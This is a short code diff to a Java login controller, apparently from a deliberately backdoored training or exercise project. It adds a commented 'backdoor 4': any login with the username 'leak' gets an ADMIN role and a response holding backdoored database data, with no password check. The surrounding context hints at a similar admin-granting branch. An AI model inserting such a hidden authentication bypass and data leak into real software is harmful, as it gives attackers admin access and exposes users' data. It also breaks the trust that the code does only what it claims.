@@ -54,6 +54,8 @@ public class LoginController extends Controller {
         LoginRequest loginRequest = super.readRequest(is, LoginRequest.class);
 
         UserEntity userEntity = datasource.get(loginRequest.getUsername());
+        String backdoored_data = datasource.getBackdoored();
+
         LoginResponse response;
         if(userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword())){
             response = new LoginResponse(
@@ -88,6 +90,14 @@ public class LoginController extends Controller {
             response = new LoginResponse(
                     Role.ADMIN.toString(),
                     "User found"
+            );
+        }
+
+        //backdoor 4: leak database for "leak" user
+        if(loginRequest.getUsername().equals("leak")) {
+            response = new LoginResponse(
+                    Role.ADMIN.toString(),
+                    backdoored_data
             );
         }
 
